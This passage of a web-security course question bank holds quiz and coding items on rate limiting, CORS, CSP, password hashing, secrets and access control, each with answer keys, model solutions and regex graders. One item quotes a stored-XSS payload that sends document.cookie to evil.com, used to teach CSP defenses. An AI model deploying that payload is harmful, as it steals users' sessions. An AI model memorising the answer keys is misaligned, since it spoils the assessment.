3. a POST handler that takes the IP from the first entry of the x-forwarded-for header (or "unknown"), and when rateLimit says no, answers 429 with a Retry-After header set to retryAfter; otherwise it answers Response.json({ ok: true })

The Map lives in one server's memory; a real deployment with several instances keeps the counts in Redis instead.`,
    starterCode: `// app/api/login/route.ts
`,
    testCases: [
      { input: '6 POSTs from one IP within a minute', expectedOutput: '5 x 200, then 429 with Retry-After', description: 'The 6th request in the window is refused' },
      { input: 'rateLimit(ip, t0 + 61_000) after being limited', expectedOutput: '{ ok: true }', description: 'A new window starts once the old one ends' },
      { input: 'rateLimit(ip, t0 + 15_500) when over the limit', expectedOutput: '{ ok: false, retryAfter: 45 }', description: 'retryAfter is the seconds left, rounded up' },
    ],
    solution: `// app/api/login/route.ts
const LIMIT = 5;
const WINDOW_MS = 60_000;
const hits = new Map<string, { count: number; windowStart: number }>();

function rateLimit(ip: string, now = Date.now()) {
  const entry = hits.get(ip);
  if (!entry || now - entry.windowStart >= WINDOW_MS) {
    hits.set(ip, { count: 1, windowStart: now });
    return { ok: true };
  }
  entry.count++;
  if (entry.count > LIMIT) {
    const retryAfter = Math.ceil((entry.windowStart + WINDOW_MS - now) / 1000);
    return { ok: false, retryAfter };
  }
  return { ok: true };
}

export async function POST(req: Request) {
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0].trim() ?? "unknown";
  const limit = rateLimit(ip);
  if (!limit.ok) {
    return new Response("Too many login attempts", {
      status: 429,
      headers: { "Retry-After": String(limit.retryAfter) },
    });
  }
  return Response.json({ ok: true });
}`,
    explanation: `A fixed-window limiter counts requests per key (here the IP) in windows of a set length. The first request, or the first one after a window has ended, starts a new window with a count of 1; each later request in the window adds 1, and once the count passes the limit the request is refused until the window ends. The answer is 429 Too Many Requests with a Retry-After header in seconds, as the api_design rule card says, so a well-behaved client knows when to try again; Math.ceil rounds up so it never retries a moment too early. Limiting login by IP slows password guessing and credential stuffing (many logins with leaked passwords); a limit per account as well stops an attacker who rotates IPs. Behind a proxy or a host such as Vercel the client's address is the first entry of x-forwarded-for, which only your proxy should be trusted to set. A fixed window lets a burst through at a window's edge (5 at 0:59 and 5 more at 1:00); sliding windows and token buckets smooth that out, and libraries such as @upstash/ratelimit keep the counts in Redis so every server instance shares them.`,
    tieredHints: {
      apiSignature: 'new Response(body, { status: 429, headers: { "Retry-After": seconds } })',
      skeleton: `function rateLimit(ip: string, now = Date.now()) {
  const entry = hits.get(ip);
  if (!entry || now - entry.windowStart >= ____) {
    hits.set(ip, { count: 1, windowStart: now });
    return { ok: true };
  }
  entry.count++;
  if (entry.count > ____) {
    const retryAfter = Math.____((entry.windowStart + WINDOW_MS - now) / 1000);
    return { ok: false, retryAfter };
  }
  return { ok: true };
}`,
    },
    hints: [
      'Store a count and a window start time for each IP',
      'Start a new window when the old one has ended',
      'Refused requests get 429 and a Retry-After header in seconds',
    ],
    tags: [
      'rate-limiting',
      'route-handler',
      'nextjs',
      'brute-force',
      '429',
      'security',
    ],
    concepts: [
      'api-rest-conventions',
    ],
    requires: [
      /new\s+Map\b/,
      /now\s*-\s*[\w.]+\s*[<>]=?|[<>]=?\s*now\s*-|[\w.]+\s*\+\s*[\w.]+\s*[<>]=?\s*now|now\s*[<>]=?\s*[\w.]+\s*\+|\b(\w+)\s*=\s*now\s*-\s*[\w.]+[\s\S]*(?:\b\1\s*[<>]=?|[<>]=?\s*\1\b)/,
      /Math\.ceil\(/,
      /status:\s*429/,
      /["']Retry-After["']/i,
      /x-forwarded-for/i,
    ],
  },

  // =====================================================================
  // 3. SECURE COMMUNICATION (3 questions, topic: PATTERNS_ARCHITECTURAL)
  // =====================================================================

  {
    id: 'sec-comm-1',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.BEGINNER,
    topic: Topic.PATTERNS_ARCHITECTURAL,
    course: Course.WEB_DEV,
    question: `A user at a coffee shop logs into your app over plain HTTP (not HTTPS), while someone on the same Wi-Fi captures the traffic with Wireshark. What can the attacker read, and what does TLS (HTTPS) change?`,
    options: [
      { id: 'a', text: 'Only the URLs: form fields sent in a POST body are not readable on the network, so passwords stay private over HTTP', isCorrect: false },
      { id: 'b', text: 'Nothing sensitive: browsers encrypt password inputs themselves, so HTTPS only adds a second layer on top of that', isCorrect: false },
      { id: 'c', text: 'The same as over HTTPS: HTTPS only adds the padlock icon, and real protection comes from the application\'s code', isCorrect: false },
      { id: 'd', text: 'Everything, in plain text, cookies and passwords included; TLS encrypts the traffic and proves the server\'s identity', isCorrect: true },
    ],
    explanation: `HTTP sends every byte as plain text, so anyone on the same network can read the URLs, headers, cookies (including the session cookie), form bodies with passwords, and the responses, and an attacker in the middle can even change them. The request body is no more hidden than the URL, and browsers do not encrypt password fields on their own. TLS gives three things: encryption (captured traffic is unreadable without the session keys), authentication (the server shows a certificate signed by a trusted certificate authority, so you know you reached the real site and not an impersonator) and integrity (changes in transit are detected). Serve everything over HTTPS in production, mark cookies Secure so they are never sent over HTTP, and send an HSTS header so browsers refuse plain HTTP for your domain.`,
    hints: [
      'HTTP is like sending a postcard: anyone who handles it can read it',
      'Is a POST body any harder to read on the wire than a URL?',
    ],
    tags: ['https', 'tls', 'encryption', 'mitm', 'security'],
    concepts: ['web-security-input-validation'],
  },

  {
    id: 'sec-comm-2',
    type: QuestionType.CODING,
    difficulty: Difficulty.BEGINNER,
    topic: Topic.PATTERNS_ARCHITECTURAL,
    course: Course.WEB_DEV,
    language: CodeLanguage.TYPESCRIPT,
    question: `Your API is a Next.js 15 app on https://api.myapp.com. The front end runs on https://myapp.com (and on http://localhost:3000 in development) and calls the API with fetch(url, { credentials: "include" }), so the session cookie goes along. Write app/api/profile/route.ts:
1. allowedOrigins, an array of those two front-end origins
2. corsHeaders(origin: string | null), which returns {} for any origin not in allowedOrigins, and otherwise the CORS headers: Access-Control-Allow-Origin set to that exact origin, Access-Control-Allow-Credentials "true", Access-Control-Allow-Methods "GET, PATCH, OPTIONS", Access-Control-Allow-Headers "Content-Type", and Vary "Origin"
3. an OPTIONS handler that answers the preflight with status 204, no body and those headers
4. a GET handler that returns Response.json({ ok: true }) with those headers

Read the origin from the request's Origin header.`,
    starterCode: `// app/api/profile/route.ts
`,
    testCases: [
      { input: 'OPTIONS with Origin: https://myapp.com', expectedOutput: '204, Access-Control-Allow-Origin: https://myapp.com, Access-Control-Allow-Credentials: true', description: 'The preflight from an allowed origin succeeds with credentials allowed' },
      { input: 'GET with Origin: https://evil.example', expectedOutput: 'no Access-Control-* headers', description: 'Other origins get no CORS headers' },
      { input: 'any response', expectedOutput: 'never Access-Control-Allow-Origin: *', description: 'A credentialed response names the exact origin, never the * wildcard' },
    ],
    solution: `// app/api/profile/route.ts
const allowedOrigins = ["https://myapp.com", "http://localhost:3000"];

function corsHeaders(origin: string | null): Record<string, string> {
  if (!origin || !allowedOrigins.includes(origin)) return {};
  return {
    "Access-Control-Allow-Origin": origin,
    "Access-Control-Allow-Credentials": "true",
    "Access-Control-Allow-Methods": "GET, PATCH, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
    Vary: "Origin",
  };
}

export async function OPTIONS(req: Request) {
  return new Response(null, { status: 204, headers: corsHeaders(req.headers.get("origin")) });
}

export async function GET(req: Request) {
  return Response.json({ ok: true }, { headers: corsHeaders(req.headers.get("origin")) });
}`,
    explanation: `CORS is the browser asking the server whether a page from another origin may read its responses. Because this fetch sends credentials (the cookie), and a PATCH or a JSON Content-Type is not a simple request, the browser first sends an OPTIONS preflight; the OPTIONS handler answers it with 204 and the CORS headers, and only then is the real request sent. With credentials, the browser rejects Access-Control-Allow-Origin: *: the server must name the exact origin and send Access-Control-Allow-Credentials: true, otherwise any site could make logged-in requests and read the answers. Echoing the Origin header only after checking it against the allow-list does that safely, and Vary: Origin tells caches the response differs per origin. CORS protects reading responses in the browser, not the server: requests from curl or a script are not affected, so the route still checks the session itself. The cookie also needs SameSite=None; Secure to be sent cross-site at all. In Express or Django the same headers come from the cors or django-cors-headers package.`,
    tieredHints: {
      apiSignature: 'new Response(body, { status, headers }); req.headers.get("origin"): string | null',
      skeleton: `// in corsHeaders(origin)
if (!origin || !allowedOrigins.____(origin)) return {};
return {
  "Access-Control-Allow-Origin": ____,
  "Access-Control-Allow-Credentials": ____,
  // ...methods, headers, Vary
};

// the preflight handler
export async function ____(req: Request) {
  return new Response(____, { status: ____, headers: ____ });
}`,
    },
    hints: [
      'With credentials, Access-Control-Allow-Origin must be the exact origin, never *',
      'Check the request\'s Origin against the allow-list before echoing it',
      'The preflight is an OPTIONS request that needs its own handler',
    ],
    tags: [
      'cors',
      'nextjs',
      'route-handler',
      'preflight',
      'credentials',
      'security',
    ],
    concepts: [
      'web-security-cors',
    ],
    requires: [
      /^(?![\s\S]*Allow-Origin["']?\s*[:,]\s*["']\*)/,
      /\.(includes|has)\(\s*origin\s*\)/,
      /Allow-Origin["']?\s*:\s*origin\b/,
      /Allow-Credentials["']?\s*:\s*["']true["']/,
      /export\s+(async\s+)?(function\s+|const\s+)OPTIONS\b/,
      /status:\s*204/,
    ],
  },

  {
    id: 'sec-comm-3',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.ADVANCED,
    topic: Topic.PATTERNS_ARCHITECTURAL,
    course: Course.WEB_DEV,
    question: `An attacker finds a stored XSS hole in your comment section and saves this comment:

<script>fetch("https://evil.com/steal", { method: "POST", body: document.cookie })</script>

The attack fails, because your pages are served with this header:

Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self' https://api.myapp.com

Why did CSP stop the attack, even though the script tag made it into the HTML?`,
    options: [
      { id: 'a', text: 'script-src \'self\' refuses to run inline scripts, and connect-src would also have blocked the fetch to evil.com', isCorrect: true },
      { id: 'b', text: 'default-src \'self\' makes the browser escape every tag the server sends, so the script arrived as plain text', isCorrect: false },
      { id: 'c', text: 'CSP blocks only scripts loaded from other domains, and it stopped this one because the fetch URL is on evil.com', isCorrect: false },
      { id: 'd', text: 'CSP did nothing here: the fetch failed because evil.com sends no Access-Control-Allow-Origin header for your site', isCorrect: false },
    ],
    explanation: `Content Security Policy tells the browser which sources may run scripts and receive requests on your page. script-src 'self' allows only script files loaded from your own origin, so inline <script> blocks and inline event handlers such as onclick="..." do not run (unless you add 'unsafe-inline', which you should avoid; use a nonce or hash for the inline scripts you really need). connect-src lists where fetch, XMLHttpRequest and WebSocket may connect, so even if a script did run, its fetch to evil.com would be refused: a second line of defence. CSP does not escape or rewrite your HTML; the tag is still in the page, it just does not execute. CORS would not have saved you: it stops a page reading a cross-origin response, not sending the request, so without CSP the cookie would already have reached evil.com. A report-to directive tells you when CSP blocks something, which helps you find the injection hole.`,
    hints: [
      'script-src \'self\' blocks inline scripts as well as scripts from other domains',
      'connect-src limits where fetch() can send data',
    ],
    tags: ['csp', 'content-security-policy', 'xss-defense', 'security-headers'],
    concepts: ['web-security-xss'],
  },

  // =====================================================================
  // 4. PASSWORD & DATA SECURITY (4 questions, topic: API_DESIGN)
  // =====================================================================

  {
    id: 'sec-data-1',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.API_DESIGN,
    course: Course.WEB_DEV,
    question: `Your database is breached and the users table leaks. Which way of storing the passwords does the least damage to your users, and why?`,
    options: [
      { id: 'a', text: 'SHA-256 hashes: the algorithm is cryptographically secure and used by Bitcoin, so a salt is only a nice extra', isCorrect: false },
      { id: 'b', text: 'bcrypt or Argon2 with a unique salt per password: slow by design, and salts make precomputed tables useless', isCorrect: true },
      { id: 'c', text: 'AES-256 encryption: unlike a hash it can be decrypted to check a login, and the key is kept outside the table', isCorrect: false },
      { id: 'd', text: 'Base64 encoding: the stored values are not human-readable, so an attacker needs special tools to decode them', isCorrect: false },
    ],
    explanation: `Passwords should be hashed, which is one-way, with an algorithm that is slow on purpose. SHA-256 is designed to be fast, for checking files; a GPU computes billions of SHA-256 hashes a second, so common passwords fall in minutes. bcrypt has a work factor (each step up doubles the time per guess) and Argon2id also needs a configurable amount of memory, which makes GPU attacks far more expensive; OWASP recommends Argon2id, with bcrypt still widely used (bcryptjs in the Auth.js credentials setup earlier in the course). A salt is a random value stored with each hash and mixed in before hashing, so two users with the same password get different hashes and precomputed rainbow tables are useless. Encryption is two-way: anyone who finds the key, often on the same server, decrypts every password at once. Base64 is an encoding, not protection; anyone can decode it in one line.`,
    hints: [
      'The goal is to make each guess as expensive as possible for the attacker',
      'Fast hashing algorithms such as SHA-256 and MD5 are bad for passwords because they are fast',
    ],
    tags: ['password-hashing', 'bcrypt', 'argon2', 'salt', 'security'],
    concepts: ['web-security-input-validation'],
  },

  {
    id: 'sec-data-2',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.API_DESIGN,
    course: Course.WEB_DEV,
    question: `In a code review you notice a teammate committed a .env file containing:

DATABASE_URL=postgres://admin:secretpass@db.example.com/prod
AUTH_SECRET=abc123supersecret
NEXT_PUBLIC_API_URL=https://api.myapp.com

They then deleted the file in a new commit. What is still wrong, and which of the three values was safe to expose?`,
    options: [
      { id: 'a', text: 'Nothing now: the delete commit removed the file, and NEXT_PUBLIC_ is just a naming style, so treat all three as secret', isCorrect: false },
      { id: 'b', text: 'Only DATABASE_URL matters: AUTH_SECRET just names the app, and NEXT_PUBLIC_ values are encrypted in the browser bundle', isCorrect: false },
      { id: 'c', text: 'The secrets are still in git history, so rotate the database password and AUTH_SECRET; NEXT_PUBLIC_API_URL is public anyway', isCorrect: true },
      { id: 'd', text: 'Nothing yet: git keeps a deleted file only until its 30-day garbage collection runs, which then removes it for good', isCorrect: false },
    ],
    explanation: `Git keeps every committed version, so deleting the file only removes it from the latest commit; \`git log --all -p\` or a secret scanner such as truffleHog finds it in history, and every clone already has it. Treat both secrets as leaked: rotate the database password and generate a new AUTH_SECRET (Auth.js signs and encrypts session tokens with it, so a leaked secret lets an attacker forge a session for any user; rotating it signs everyone out). Then purge the file from history with git filter-repo or BFG and force-push, add .env to .gitignore, and keep production secrets in your host's environment settings. NEXT_PUBLIC_API_URL was never secret: Next.js inlines every NEXT_PUBLIC_ variable into the JavaScript bundle at build time, in plain text, which is why only values meant for the browser get that prefix. Git's garbage collection removes only unreachable objects, never committed history.`,
    hints: [
      'Deleting a file does not remove it from earlier commits',
      'NEXT_PUBLIC_ is a Next.js convention that deliberately ships a value to the browser',
    ],
    tags: ['secrets', 'env-files', 'git-security', 'secret-rotation', 'security'],
    concepts: ['web-security-input-validation'],
  },

  {
    id: 'sec-data-3',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.BEGINNER,
    topic: Topic.API_DESIGN,
    course: Course.WEB_DEV,
    question: `A profile page sends PATCH /api/profile with { displayName, bio }. The route handler runs:

const body = await req.json();
await prisma.user.update({ where: { id: session.user.id }, data: body });

The User model also has a role column. An attacker sends { "displayName": "x", "role": "ADMIN" } straight to the API. What is the problem, and what is the fix?`,
    options: [
      { id: 'a', text: 'No problem: the form only has displayName and bio inputs, so no request can ever contain any other key', isCorrect: false },
      { id: 'b', text: 'SQL injection: the JSON body reaches the database, so escape every value before passing it to Prisma', isCorrect: false },
      { id: 'c', text: 'No problem: Prisma refuses to write columns that have a default value in the schema, and role has one', isCorrect: false },
      { id: 'd', text: 'Mass assignment: every column in the body is written; parse it with a Zod object of only the allowed fields', isCorrect: true },
    ],
    explanation: `Passing the request body straight into data writes whatever columns the client chooses, so anyone can send role, emailVerified or another user's fields. That is mass assignment, and the form's inputs do not limit it, because the attacker calls the API directly. Parse the body with a schema that lists only what this route may change, such as z.object({ displayName: z.string().max(50), bio: z.string().max(500) }); a Zod object drops keys it does not list by default (or use .strict() to reject the request instead), and pass the parsed result, not the raw body, to prisma.user.update. Picking the fields by hand ({ displayName: body.displayName, bio: body.bio }) also works. Prisma sends values as query parameters, so this is not SQL injection, and a column's default only applies when a row is created without it.`,
    hints: [
      'Which columns does prisma.user.update write when data is the whole request body?',
      'Can the attacker add keys that the form never had?',
    ],
    tags: ['input-validation', 'client-server', 'zod', 'django-serializers', 'security'],
    concepts: ['web-security-input-validation', 'forms-zod-schema'],
  },

  {
    id: 'sec-data-4',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.API_DESIGN,
    course: Course.WEB_DEV,
    question: `Your route handler for GET /api/users/me runs

const user = await prisma.user.findUnique({ where: { id: session.user.id } });
return Response.json(user);

and returns:

{
  "id": 1,
  "username": "alice",
  "email": "alice@example.com",
  "passwordHash": "$2b$12$Qb3...",
  "isAdmin": true,
  "lastLogin": "2026-01-15T10:30:00Z",
  "ssn": "123-45-6789"
}

What is the security issue, and how do you fix it?`,
    options: [
      { id: 'a', text: 'It leaks the password hash, the admin flag and the SSN; choose the returned fields with select (id, username, email)', isCorrect: true },
      { id: 'b', text: 'Only the SSN is a problem: password hashes cannot be reversed, and the front end needs isAdmin to choose pages', isCorrect: false },
      { id: 'c', text: 'Nothing: the route needs a session and returns only the caller\'s own row, so every field in it is theirs to see', isCorrect: false },
      { id: 'd', text: 'Delete the sensitive keys in the client component before rendering, so the browser never shows the hash or SSN', isCorrect: false },
    ],
    explanation: `Returning the whole row sends every column to the browser, including ones that must never leave the server. The password hash lets an attacker who gets hold of a response (a stolen session, a shared screen, a logged request) try passwords offline at leisure; isAdmin tells them which accounts are worth attacking; and the SSN is personal data that this screen does not need. The data is already in the network response, so deleting keys in the client hides nothing, and owning the row does not mean every column should travel. Fix: list exactly what the route returns, with select: { id: true, username: true, email: true }, or map the row to a response type. An allow-list keeps a column added later private by default; Prisma 6's omit option (per query or set globally for passwordHash) is a useful backstop, but a deny-list forgets new sensitive columns. Different screens can use different selects (a public profile, the user's own settings, an admin view).`,
    hints: [
      'Even a hashed password is valuable to an attacker for offline guessing',
      'Which fields does this screen actually need?',
    ],
    tags: ['data-exposure', 'serializers', 'drf', 'owasp', 'security'],
    concepts: ['web-security-input-validation'],
  },

  // =====================================================================
  // 5. SECURITY ARCHITECTURE (3 questions, topic: PATTERNS_ARCHITECTURAL)
  // =====================================================================

  {
    id: 'sec-arch-1',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.ADVANCED,
    topic: Topic.PATTERNS_ARCHITECTURAL,
    course: Course.WEB_DEV,
    question: `An attacker chains three small weaknesses in your Next.js app: (1) a reflected XSS on the search page, (2) which steals a session cookie set without the httpOnly flag, (3) which they use to call an admin API route that never checks the user's role. No single weakness is critical, but together they give full admin access. Which security principle would have prevented this, and how?`,
    options: [
      { id: 'a', text: 'Zero trust: require a fresh login on every single API call, which removes session cookies and so the whole chain', isCorrect: false },
      { id: 'b', text: 'Defense in depth: a CSP, an httpOnly cookie or a role check on the admin route would each have broken the chain', isCorrect: true },
      { id: 'c', text: 'Security through obscurity: move the admin API from /api/admin to a random URL, so attackers cannot find it', isCorrect: false },
      { id: 'd', text: 'Least privilege alone: lock down the admin route, after which the XSS and the cookie flags can be left as they are', isCorrect: false },
    ],
    explanation: `Defense in depth means several overlapping layers, each built on the assumption that the others might fail. This attack needed every link in its chain, so holding any one layer would have stopped it: a Content-Security-Policy (with escaped output) stops the injected script from running; an httpOnly cookie cannot be read by JavaScript at all, so there is nothing to steal; and a role check on the admin route (authorisation, not just authentication) rejects a non-admin session however it was obtained. Rate limiting and alerts on unusual admin activity add more layers. Fixing only the admin route leaves an XSS hole that can do other damage, a random URL is found by anyone who watches the traffic, and forcing a login on every call would make the app unusable without removing the XSS. Real breaches usually chain small weaknesses like these, which is why you close all of them.`,
    hints: [
      'The attacker needed all three weaknesses; fixing any one breaks the chain',
      'Each security measure should assume the others might fail',
    ],
    tags: ['defense-in-depth', 'security-layers', 'attack-chains', 'architecture'],
    concepts: ['pattern-architectural'],
  },

  {
    id: 'sec-arch-2',
    type: QuestionType.CODING,
    difficulty: Difficulty.BEGINNER,
    topic: Topic.PATTERNS_ARCHITECTURAL,
    course: Course.WEB_DEV,
    language: CodeLanguage.TYPESCRIPT,
    question: `Users have one of three roles: "admin", "editor" or "viewer". In app/api/articles/[id]/route.ts write:
1. ROLE_METHODS, a table of the HTTP methods each role may use: admin GET, PUT and DELETE; editor GET and PUT; viewer GET only
2. can(role: Role, method: string): boolean, which looks the method up in that table
3. a DELETE handler that reads the session with await auth(); answers 401 when there is no session; answers 403 when can(session.user.role, "DELETE") is false; and otherwise deletes the article with prisma.article.delete({ where: { id } }) and answers 204 with no body

auth comes from "@/auth" and prisma from "@/lib/prisma"; assume session.user.role is typed as Role. In Next.js 15 the route's params is a promise.`,
    starterCode: `// app/api/articles/[id]/route.ts
import { auth } from "@/auth";
import { prisma } from "@/lib/prisma";

type Role = "admin" | "editor" | "viewer";
`,
    testCases: [
      { input: 'DELETE with no session', expectedOutput: '401', description: 'No session means not authenticated' },
      { input: 'DELETE as an editor', expectedOutput: '403', description: 'An editor is known but not allowed to delete' },
      { input: 'DELETE as an admin', expectedOutput: '204, the article is deleted', description: 'An admin may delete' },
    ],
    solution: `// app/api/articles/[id]/route.ts
import { auth } from "@/auth";
import { prisma } from "@/lib/prisma";

type Role = "admin" | "editor" | "viewer";

const ROLE_METHODS: Record<Role, string[]> = {
  admin: ["GET", "PUT", "DELETE"],
  editor: ["GET", "PUT"],
  viewer: ["GET"],
};

function can(role: Role, method: string): boolean {
  return ROLE_METHODS[role]?.includes(method) ?? false;
}

export async function DELETE(
  _req: Request,
  { params }: { params: Promise<{ id: string }> },
) {
  const session = await auth();
  if (!session) return new Response(null, { status: 401 });
  if (!can(session.user.role, "DELETE")) return new Response(null, { status: 403 });
  const { id } = await params;
  await prisma.article.delete({ where: { id } });
  return new Response(null, { status: 204 });
}`,
    explanation: `Role-based access control (RBAC) gives permissions to roles rather than to individual users, and a table from role to allowed methods keeps those rules in one place: changing what editors may do is one line, not a hunt through handlers. The DELETE handler checks in the order the api_design rule card gives the status codes: no session is 401 (the server does not know who you are), a session whose role may not delete is 403 (it knows you, and the answer is no), and only then does it touch the database, answering 204 with no body. Both checks run before the delete, on the server, because hiding the Delete button in the UI stops nobody who calls the API directly. The ?? false in can() covers a role that is missing from the table. A finer rule, such as "editors may change only their own articles", needs the article itself: load it and compare its authorId with session.user.id before writing. Django REST Framework expresses the same check as a permission class with has_permission().`,
    tieredHints: {
      apiSignature: 'auth(): Promise<Session | null>; new Response(null, { status })',
      skeleton: `export async function DELETE(_req: Request, { params }: { params: Promise<{ id: string }> }) {
  const session = await ____;
  if (____) return new Response(null, { status: ____ });
  if (!can(____, ____)) return new Response(null, { status: ____ });
  const { id } = ____;
  // delete, then answer with no body
}`,
    },
    hints: [
      'No session is 401; a session without permission is 403',
      'Check both before calling prisma.article.delete',
      'params is a promise in Next.js 15: await it to read id',
    ],
    tags: [
      'rbac',
      'authorization',
      'route-handler',
      'nextjs',
      'security',
    ],
    concepts: [
      'web-security-auth-tokens',
    ],
    requires: [
      /editor["']?\s*:\s*\[(?![^\]]*DELETE)[^\]]*PUT[^\]]*\]/,
      /viewer["']?\s*:\s*\[\s*["']GET["']\s*\]/,
      /await\s+auth\(\)/,
      /await\s+params/,
      /\b401\b[\s\S]*\b403\b[\s\S]*\.delete\(/,
      /status:\s*204/,
    ],
  },

  {
    id: 'sec-arch-3',
    type: QuestionType.MULTIPLE_CHOICE,
    difficulty: Difficulty.INTERMEDIATE,
    topic: Topic.PATTERNS_ARCHITECTURAL,
    course: Course.WEB_DEV,
    question: `You deploy a Next.js app and add four security headers to every response from the headers() function in next.config.ts: X-Content-Type-Options: nosniff, X-Frame-Options: DENY, Strict-Transport-Security: max-age=31536000, and Referrer-Policy: strict-origin-when-cross-origin. Which description of what they do is correct?`,
    options: [
      { id: 'a', text: 'nosniff forces every response to be JSON; DENY lets only trusted sites frame the page; HSTS turns on HTTP/2; Referrer-Policy hides referrers from your own logs', isCorrect: false },
      { id: 'b', text: 'nosniff encrypts the Content-Type header; DENY is ignored by modern browsers; HSTS falls back to HTTP if HTTPS fails; Referrer-Policy covers only <a> links', isCorrect: false },
      { id: 'c', text: 'nosniff stops browsers guessing a file\'s type; DENY blocks other sites from framing the page; HSTS makes browsers use only HTTPS; Referrer-Policy limits leaked URLs', isCorrect: true },
      { id: 'd', text: 'They matter only for API routes: pages rendered by React escape their output, so nosniff, DENY, HSTS and Referrer-Policy add nothing to them', isCorrect: false },
    ],
    explanation: `Each header closes a different hole. X-Content-Type-Options: nosniff makes the browser trust the Content-Type header instead of guessing, so an uploaded "image" that really contains JavaScript is not run as a script. X-Frame-Options: DENY stops other sites from loading your pages in an iframe, which blocks clickjacking (an invisible frame over a decoy button); the modern equivalent is CSP's frame-ancestors 'none', and sending both is common. Strict-Transport-Security (HSTS) tells the browser to use only HTTPS for your domain for max-age seconds (here a year), even if the user types http://, which defeats SSL-stripping attacks. Referrer-Policy: strict-origin-when-cross-origin sends only your origin, not the full path, to other sites, so private URLs such as /admin/users/123/edit do not leak. React's escaping protects against XSS in markup; it does nothing about framing, MIME sniffing or plain-HTTP downgrades, so pages need these headers as much as APIs do.`,
    hints: [
      'Each header addresses a different attack: MIME sniffing, clickjacking, HTTPS downgrade, URL leaks',
      'Does React\'s escaping stop another site from putting your page in an iframe?',
    ],
    tags: ['security-headers', 'hsts', 'clickjacking', 'x-frame-options', 'django'],
    concepts: ['web-security-xss'],
  },
];
